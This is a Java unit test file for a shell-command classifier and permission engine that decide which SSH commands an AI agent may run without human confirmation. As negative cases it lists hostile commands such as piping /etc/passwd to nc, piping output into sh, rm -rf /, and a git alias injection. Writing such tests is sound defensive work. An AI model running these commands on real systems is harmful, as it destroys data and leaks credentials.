package com.aye.ai.permission;

import com.aye.ai.util.Json;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * {@link ReadOnlyCommandClassifier} 与引擎免确认规则的正反用例。
 * 安全语义：返回 false 只回落人工确认，永不拒绝——因此反向用例必须全部为 false，
 * 任何一个「能改系统的命令被判 true」都是免确认通道的安全漏洞。
 */
class ReadOnlyCommandClassifierTest {

    @Nested
    @DisplayName("应证明为只读（免确认）")
    class ProvablyReadOnly {

        @ParameterizedTest(name = "[{index}] {0}")
        @ValueSource(strings = {
                "ls -la",
                "ls",
                "ps aux",
                "df -h",
                "free -m",
                "uptime",
                "id",
                "ss -tlnp",
                "netstat -tlnp",
                "cat /etc/hosts",
                "cat /etc/hosts 2>&1",
                "grep -rn 'foo' /etc/nginx",
                "ps aux | grep java",
                "docker ps",
                "docker ps -a --format '{{.Names}}'",
                "docker logs nginx --tail 100",
                "docker images",
                "docker stats --no-stream",
                "systemctl status nginx",
                "systemctl is-active nginx",
                "journalctl -u nginx -n 200",
                "git status",
                "git log --oneline -5",
                "git diff",
                "tar -tzf a.tar.gz",
                "tar -tf a.tar",
                "kubectl get pods -n default",
                "kubectl describe pod nginx",
                "kubectl logs nginx --tail 50",
                "redis-cli GET mykey",
                "redis-cli KEYS 'user:*'",
                "nginx -t",
                "crontab -l",
                "find /var/log -name '*.log' -type f",
                "ip addr show",
                "iptables -L -n -v",
                "cat '/tmp/$weird/name'",
        })
        void readOnly(String cmd) {
            assertTrue(ReadOnlyCommandClassifier.isProvablyReadOnly(cmd),
                    "命令应被证明为只读：" + cmd);
        }
    }

    @Nested
    @DisplayName("必须无法证明只读（回落确认）")
    class NotProvablyReadOnly {

        @ParameterizedTest(name = "[{index}] {0}")
        @ValueSource(strings = {
                // ── 复合结构 / shell 元字符 ──
                "ls; rm -rf x",
                "ls && reboot",
                "ls || true",
                "ls &",
                "ls\nrm x",
                "cat /etc/passwd | tee b",
                "grep a b | sh",
                "ls | bash",
                "cat /etc/passwd | nc host 9999",
                "echo x > /etc/a",
                "ls > /tmp/out",
                "cat x >> /etc/a",
                "cat < /etc/passwd",
                "ls $(whoami)",
                "cat `hostname`",
                "cat \"$HOME/a\"",
                "cat $HOME/a",
                "FOO=bar docker ps",
                "(ls)",
                // ── 保留字 / 解释器 / 提权 ──
                "eval ls",
                "sudo ls",
                "bash -c ls",
                "sh -c id",
                "xargs rm",
                "exec ls",
                // ── 伪装 / 未知程序 ──
                "/tmp/evil",
                "/usr/local/bin/evil --help",
                "unknowncmd --foo",
                // ── find / tar / 压缩器危险动作 ──
                "find / -delete",
                "find . -name x -exec rm {} \\;",
                "find . -exec sh -c id \\;",
                "tar -xzf a.tgz",
                "tar -czf out.tgz /etc",
                "gzip a.log",
                "unzip a.zip",
                // ── git 写操作与 -c 别名注入 ──
                "git -c alias.x='!id' status",
                "git push",
                "git commit -m x",
                "git reset --hard HEAD",
                "git config user.name x",
                "git remote set-url origin x",
                "git branch -d feature",
                // ── docker / compose / k8s 写操作 ──
                "docker run alpine sh",
                "docker exec c sh",
                "docker stop nginx",
                "docker rm nginx",
                "docker compose up -d",
                "docker-compose restart",
                "kubectl delete pod x",
                "kubectl apply -f deploy.yaml",
                "kubectl exec pod -- sh",
                "helm upgrade release chart",
                // ── 服务 / 系统操作 ──
                "systemctl restart nginx",
                "systemctl stop nginx",
                "reboot",
                "shutdown -h now",
                "crontab -e",
                "nginx -s reload",
                "iptables -F",
                "iptables -A INPUT -j DROP",
                // ── 包管理写操作 ──
                "apt install nginx",
                "apt-get remove nginx",
                "dnf update",
                "pip install requests",
                "npm i lodash",
                "dpkg -i pkg.deb",
                "rpm -e nginx",
                // ── 数据存储 / 排序写文件等 ──
                "redis-cli SET a b",
                "redis-cli FLUSHALL",
                "sort -o out a",
                "rm -rf /tmp/x",
                "mv a b",
                "cp a b",
                "mkdir foo",
                "touch foo",
                "chmod 777 x",
                "tee /etc/x",
                // ── 边界：空与空白 ──
                "",
                "   ",
        })
        void notReadOnly(String cmd) {
            assertFalse(ReadOnlyCommandClassifier.isProvablyReadOnly(cmd),
                    "命令绝不能被免确认通道放行：" + cmd);
        }
    }

    @Test
    @DisplayName("null 安全：返回 false 而非抛异常")
    void nullInput() {
        assertFalse(ReadOnlyCommandClassifier.isProvablyReadOnly(null));
    }

    @Nested
    @DisplayName("权限引擎集成：免确认规则的位置与边界")
    class EngineIntegration {

        private PermissionDecision runSsh(TrustLevel trust, String mode, String cmd) {
            PermissionContext ctx = new PermissionContext(
                    "run_ssh", Json.object(), trust, List.of(), List.of(),
                    cmd, false, "/home/user", mode, ToolCategory.EXECUTE);
            return PermissionEngine.evaluatePermission(ctx);
        }

        private PermissionDecision readTool(TrustLevel trust, String mode) {
            PermissionContext ctx = new PermissionContext(
                    "sftp_read", Json.object(), trust, List.of(), List.of(),
                    "", false, "/home/user", mode, ToolCategory.READ);
            return PermissionEngine.evaluatePermission(ctx);
        }

        @Test
        @DisplayName("STANDARD 下可证明只读命令免确认")
        void standardAllowsReadOnly() {
            assertTrue(runSsh(TrustLevel.STANDARD, null, "ls -la")
                    instanceof PermissionDecision.Allow);
            assertTrue(runSsh(TrustLevel.STANDARD, null, "docker ps")
                    instanceof PermissionDecision.Allow);
        }

        @Test
        @DisplayName("readonly 模式下可证明只读命令仍放行，写/执行命令被拒绝")
        void readonlyModeSemantics() {
            assertTrue(runSsh(TrustLevel.STANDARD, "readonly", "systemctl status nginx")
                    instanceof PermissionDecision.Allow);
            assertTrue(runSsh(TrustLevel.STANDARD, "readonly", "systemctl restart nginx")
                    instanceof PermissionDecision.Deny);
        }

        @Test
        @DisplayName("PARANOID 全确认模式：只读命令也必须确认，不走免确认通道")
        void paranoidStillConfirms() {
            assertTrue(runSsh(TrustLevel.PARANOID, null, "ls -la")
                    instanceof PermissionDecision.Confirm);
            assertTrue(readTool(TrustLevel.PARANOID, null)
                    instanceof PermissionDecision.Confirm);
        }

        @Test
        @DisplayName("STANDARD 下无法证明只读的命令回落人工确认")
        void standardFallsBackToConfirm() {
            assertTrue(runSsh(TrustLevel.STANDARD, null, "systemctl restart nginx")
                    instanceof PermissionDecision.Confirm);
            assertTrue(runSsh(TrustLevel.STANDARD, null, "crontab -e")
                    instanceof PermissionDecision.Confirm);
        }

        @Test
        @DisplayName("硬黑名单优先于免确认与 TRUSTED：rm -rf / 任何模式都 Deny")
        void blacklistWins() {
            assertTrue(runSsh(TrustLevel.TRUSTED, null, "rm -rf /")
                    instanceof PermissionDecision.Deny);
            assertTrue(runSsh(TrustLevel.STANDARD, null, "ls; rm -rf /")
                    instanceof PermissionDecision.Deny);
        }
    }
}
